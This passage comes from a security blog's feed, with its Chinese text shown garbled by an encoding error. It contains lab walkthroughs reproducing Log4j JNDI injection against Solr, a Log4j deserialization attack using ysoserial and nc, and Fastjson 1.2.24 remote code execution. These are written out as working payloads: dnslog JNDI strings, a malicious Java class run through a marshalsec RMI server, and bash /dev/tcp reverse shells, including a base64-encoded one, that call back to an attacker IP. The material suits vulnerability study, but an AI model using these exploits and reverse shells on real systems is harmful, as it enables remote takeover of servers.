src="../images/image-20230417175046593.png" alt="image-20230417175046593"></p><p><strong>æ„é€ </strong></p><p><code>$&#123;jndi:dns://$&#123;sys:java.version&#125;.example.com&#125;</code>æ˜¯åˆ©ç”¨JNDIå‘é€DNSè¯·æ±‚çš„Payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.sij1vb.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥è®¿é—®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.3j7r1s.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417175341507.png" alt="image-20230417175341507"></p><p>å¾—åˆ°javaçš„ç‰ˆæœ¬æ˜¯1.8</p><p><strong>é‚£ä¹ˆè¿™ä¹Ÿè¯´æ˜äº†æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„</strong></p><p>äºæ˜¯è¿›è¡Œåå¼¹shell</p><p><strong>åå¼¹shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps_ip/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå½¢æ€</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMjkvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>åå¼¹shelléœ€è¦çš„å·¥å…·</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">å·¥å…·åœ°å€ï¼Œä¸‹é¢æ˜¯æ“ä½œæµç¨‹</a></p><p><img src="../images/image-20230417194052114.png" alt="image-20230417194052114"></p><p><img src="../images/image-20230417194154023.png" alt="image-20230417194154023"></p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMjkvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; -A <span class="string">&quot;192.168.142.129&quot;</span></span><br></pre></td></tr></table></figure><p>-Cæ˜¯ç¼–ç åçš„å†…å®¹ï¼Œ-Aæ˜¯åå¼¹shellçš„ipåœ°å€ã€‚<br>æ³¨æ„è¦å…ˆncç›‘å¬6666ç«¯å£.</p><p><img src="../images/image-20230417195106656.png" alt="image-20230417195106656"></p><p>å› ä¸ºæŸ¥å‡ºæ¥çš„javaç‰ˆæœ¬æ˜¯1.8</p><p>ç„¶åè¿›è¡ŒæŠ“åŒ…å‘åŒ…</p><p><img src="../images/image-20230417200034238.png" alt="image-20230417200034238"></p><p>æŠŠç”Ÿæˆçš„payloadæ‹¿å»æ‰“</p><p>ç„¶åå°±æˆåŠŸå°†shellåå¼¹</p><p><img src="../images/image-20230417200109588.png" alt="image-20230417200109588"></p><p><img src="../images/image-20230417200310374.png" alt="image-20230417200310374"></p><h2 id="vulhub-log4jæ¼æ´å¤ç°-CVE-2017-5645"><a href="#vulhub-log4jæ¼æ´å¤ç°-CVE-2017-5645" class="headerlink" title="vulhub-log4jæ¼æ´å¤ç°(CVE-2017-5645)"></a>vulhub-log4jæ¼æ´å¤ç°(<a href="https://so.csdn.net/so/search?q=CVE&amp;spm=1001.2101.3001.7020">CVE</a>-2017-5645)</h2><h4 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a><strong>æ¼æ´å¤ç°</strong></h4><p>è¿˜æ˜¯å…ˆåˆ©ç”¨dockeræ­å»ºç¯å¢ƒ</p><p><img src="../images/image-20230417203312678.png" alt="image-20230417203312678"></p><p>æ­å»ºå®Œæ¯•</p><p>å‡†å¤‡å·¥å…·ï¼Œè¿™é‡Œç”¨çš„æ˜¯   <a href="https://github.com/frohoff/ysoserial">ysoserial</a></p><p>ç„¶åcdè¿›å…¥è¯¥ç›®å½•ï¼Œä½¿ç”¨<code>mvn clean package -DskipTests</code>å‘½ä»¤ç”ŸæˆjaråŒ…</p><p><strong>è¿™é‡Œè¯javaç‰ˆæœ¬æ¢æˆjava1.8_20 </strong>  å’Œfastjsoné‚£ä¸ªæ–¹æ³•ä¸€æ ·æ¥è®¾ç½®javaç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java â€jar ysoserial-v0<span class="number">.0</span><span class="number">.6</span>-all.jar CommonsCollections5 <span class="string">&quot;touch /tmp/success&quot;</span> | nc <span class="number">192.168</span><span class="number">.217</span><span class="number">.134</span> <span class="number">4712</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯å¾€/tmpå‘½ä»¤é‡Œå†™å…¥successæ–‡ä»¶ï¼Œ</p><p><a href="https://blog.csdn.net/qq_51295677/article/details/125703978">å¤ç°æ–‡ç« ï¼Œæ¥ä¸‹æ¥æˆ‘å°±ä¸å†™äº†</a></p><p>å› ä¸ºä¸çŸ¥é“å“ªä¸ªipå¼€å¯äº†4712ç«¯å£</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2021-44228-Apache-Log4j-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´&quot;&gt;&lt;a href=&quot;#CVE-2021-44228-Apache-Log4j-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-44228 Apach</summary>
      
    
    
    
    
    <category term="vulhub log4j æ¼æ´å¤ç°" scheme="https://ke1nys.github.io/tags/vulhub-log4j-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>vulhub-fastjsonæ¼æ´å¤ç°</title>
    <link href="https://ke1nys.github.io/posts/5a844f8c.html"/>
    <id>https://ke1nys.github.io/posts/5a844f8c.html</id>
    <published>2023-04-17T06:48:25.000Z</published>
    <updated>2023-04-26T13:05:32.232Z</updated>
    
    <content type="html"><![CDATA[<p><img src="../images/image-20230417145033021.png" alt="image-20230417145033021"></p><p>å…ˆäº†è§£ä¸€ä¸‹ç€å‡ ä¸ªç­‰ä¼šå¤ç°éœ€è¦ç”¨åˆ°çš„ä¸œè¥¿</p><p><a href="https://cloud.tencent.com/developer/article/1974944">å¹²è´§ï½œæœ€å…¨fastjsonæ¼æ´å¤ç°ä¸ç»•è¿‡</a></p><h2 id="CVE-2017-18349å³Fastjson1-2-24-ååºåˆ—åŒ–æ¼æ´RCE"><a href="#CVE-2017-18349å³Fastjson1-2-24-ååºåˆ—åŒ–æ¼æ´RCE" class="headerlink" title="CVE-2017-18349å³Fastjson1.2.24 ååºåˆ—åŒ–æ¼æ´RCE"></a>CVE-2017-18349å³Fastjson1.2.24 ååºåˆ—åŒ–æ¼æ´RCE</h2><p><strong>ubuntu:  é¶æœº </strong>   <strong>192.168.142.137</strong></p><p><strong>kali: æ”»å‡»æœº</strong>   <strong>192.168.142.129</strong></p><h4 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a><strong>æ¼æ´åŸç†</strong></h4><p>fastjsonåœ¨è§£æjsonå¯¹è±¡æ—¶ï¼Œä¼šä½¿ç”¨autoTypeå®ä¾‹åŒ–æŸä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œå¹¶è°ƒç”¨set/getæ–¹æ³•è®¿é—®å±æ€§ã€‚æ¼æ´å‡ºç°åœ¨Fastjson autoTypeå¤„ç†jsonå¯¹è±¡æ—¶ï¼Œæ²¡æœ‰å¯¹@typeå­—æ®µè¿›è¡Œå®Œæ•´çš„å®‰å…¨æ€§éªŒè¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥å±é™©çš„ç±»å¹¶è°ƒç”¨å±é™©ç±»è¿æ¥è¿œç¨‹RMIæœåŠ¡å™¨ï¼Œé€šè¿‡æ¶æ„ç±»æ‰§è¡Œæ¶æ„ä»£ç ï¼Œè¿›è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><p>å½±å“ç‰ˆæœ¬ä¸º fastjson &lt; 1.2.25</p><h4 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><p>é¦–å…ˆè¿›å…¥fastjson 1.2.24çš„dockerç¯å¢ƒï¼Œä½¿ç”¨<code>java -version</code>æŸ¥çœ‹ä¸€ä¸‹javaçš„ç‰ˆæœ¬ä¸º1.8.0_102ã€‚å› ä¸ºjavaç¯å¢ƒä¸º102ï¼Œæ²¡æœ‰<code>com.sun.jndi.rmi.object.trustURLCodebase</code>çš„é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨<code>com.sun.rowset.JdbcRowSetImpl</code>åˆ©ç”¨é“¾ç»“åˆJNDIæ³¨å…¥æ‰§è¡Œè¿œç¨‹å‘½ä»¤</p><p><strong>å®‰è£…javacç¯å¢ƒï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨20ç‰ˆæœ¬æ›¿æ¢102</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">curl http:<span class="comment">//www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz</span></span><br><span class="line">tar zxvf jdk-8u20-linux-x64.tar.gz</span><br><span class="line">rm -rf /usr/bin/java*</span><br><span class="line">ln -s /opt/jdk1<span class="number">.8</span><span class="number">.0_20</span>/bin/j* /usr/bin</span><br><span class="line">javac -version</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417145253381.png" alt="image-20230417145253381"></p><p> æ”»å‡»æœºçš„javaç‰ˆæœ¬å¿…é¡»æ˜¯<strong>java8</strong></p><p><strong>æ‰“å¼€dockeré¶æœº</strong></p><p><img src="../images/image-20230417151012246.png" alt="image-20230417151012246"></p><p>ç¼–è¾‘æ¶æ„ç±»ä»£ç ï¼Œèµ·åä¸ºevilclass.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilclass</span>&#123;</span><br><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/test&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>String[] commands</code>å¯ä»¥è¿›è¡Œä¿®æ”¹è‡ªå·±æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è¿™é‡Œæ˜¯åœ¨<code>/tmp</code>ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>test</code>æ–‡ä»¶</p><p><strong>ä½¿ç”¨javacç¼–è¯‘evilclass.javaæ–‡ä»¶ç”Ÿæˆevilclass.class</strong></p><p><img src="../images/image-20230417152951359.png" alt="image-20230417152951359"></p><p>è¿™é‡Œçš„åŒ–æƒ³è¦æ­å»ºä¸€ä¸ªRMIæœåŠ¡ï¼Œé¦–å…ˆä¸‹è½½marshalsec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mbechler/marshalsec.git</span><br></pre></td></tr></table></figure><p>å®‰è£…mavenå¹¶ç¼–è¯‘marshalsecç”Ÿæˆjar</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install maven</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417153908651.png" alt="image-20230417153908651"></p><p>æˆ‘ä»¬è¿›å…¥åˆ°marshalsecçš„targetç›®å½•é‡Œé¢è¿›è¡ŒæŸ¥çœ‹å·²ç»ç”Ÿæˆäº†marshalsec-0.0.3.3-SNAPSHOT-all.jarï¼Œç„¶åä½¿ç”¨marshalsecæ­å»ºä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œè¿™é‡Œçš„ipå°±æ˜¯ä½ æ”»å‡»æœºçš„ipï¼Œç«¯å£å¯ä»¥éšæ„</p><p>è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨å¯åŠ¨<strong>LDAP</strong>æœåŠ¡ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer<span class="string">&quot;http://192.168.1.8/#evilclass&quot;</span>9999java-cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer<span class="string">&quot;http://192.168.1.8/#evilclass&quot;</span><span class="number">9999</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„IPæ˜¯æ”»å‡»æœºip,ç«¯å£éšæ„</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<strong>RMI</strong>æœåŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://192.168.142.129ï¼š8000/#evilclass&quot;</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417155734179.png" alt="image-20230417155734179"></p><p>å…ˆå¼€å¯ä¸€ä¸ªpythonæœåŠ¡æ¥è¿›è¡Œæ–‡ä»¶çš„ä¸Šä¼ ï¼Œå¦‚ä½•RMIä½¿ç”¨çš„æ˜¯pythonçš„8000ç«¯å£</p><p><img src="../images/image-20230417155831781.png" alt="image-20230417155831781"></p><p>å¼€å¯RMIæœåŠ¡</p><p><img src="../images/image-20230417155903891.png" alt="image-20230417155903891"></p><p>æŠ“åŒ…è¿›è¡Œå‘åŒ…</p><p>å¦‚ä½•å°±ä¼šå‘ç°æˆåŠŸäº†</p><p><img src="../images/image-20230417155934820.png" alt="image-20230417155934820"></p><p><img src="../images/image-20230417160000493.png" alt="image-20230417160000493"></p><p><img src="../images/image-20230417160023376.png" alt="image-20230417160023376"></p><p>è¿™é‡Œå°±å’Œåˆšå¼€å§‹çš„æ—¶å€™evilclass.javaé‡Œå†™çš„ä¸€æ ·äº†ï¼Œå°±æ˜¯å¾€/tmpç›®å½•é‡Œå†™ä¸€ä¸ªtestæ–‡ä»¶</p><p>å¦‚æœè¦åå¼¹shellçš„åŒ–ï¼Œåªéœ€è¦ä¿®æ”¹commandsé‡Œçš„å†…å®¹å°±è¡Œäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilclass</span>&#123;</span><br><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.142.129/9001 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230417160907087.png" alt="image-20230417160907087"></p><p>æˆåŠŸå°†shellåå¼¹</p><p>fastjsonçš„æ¼æ´å¤ç°çš„è¯éƒ½æ˜¯è¿™ä¸ªæ–¹å‘ï¼Œæˆ–è€…ä¿®æ”¹<code>com.sun.rowset.JdbcRowSetImpl</code>è¿™äº›ä¸œè¥¿ï¼Œå…¶ä»–çš„å°±ä¸è¿›è¡Œå¤ç°äº†</p><p>ä¸‹é¢å°±æ˜¯å‚è€ƒé“¾æ¥äº†  å…¶ä»–ä¸æ‡‚çš„ç‰ˆæœ¬å¯ä»¥è¿›è¡ŒæŸ¥çœ‹</p><p><a href="https://cloud.tencent.com/developer/article/1974944">å¹²è´§ï½œæœ€å…¨fastjsonæ¼æ´å¤ç°ä¸ç»•è¿‡</a></p><p><a href="https://www.freebuf.com/vuls/276812.html">Fastjsonæ¼æ´å¤ç°ç¬”è®°</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;../images/image-20230417145033021.png&quot; alt=&quot;image-20230417145033021&quot;&gt;&lt;/p&gt;
&lt;p&gt;å…ˆäº†è§£ä¸€ä¸‹ç€å‡ ä¸ªç­‰ä¼šå¤ç°éœ€è¦ç”¨åˆ°çš„ä¸œè¥¿&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://cloud.</summary>
      
    
    
    
    
    <category term="vulhub fastjson" scheme="https://ke1nys.github.io/tags/vulhub-fastjson/"/>
    
  </entry>
  
</feed>
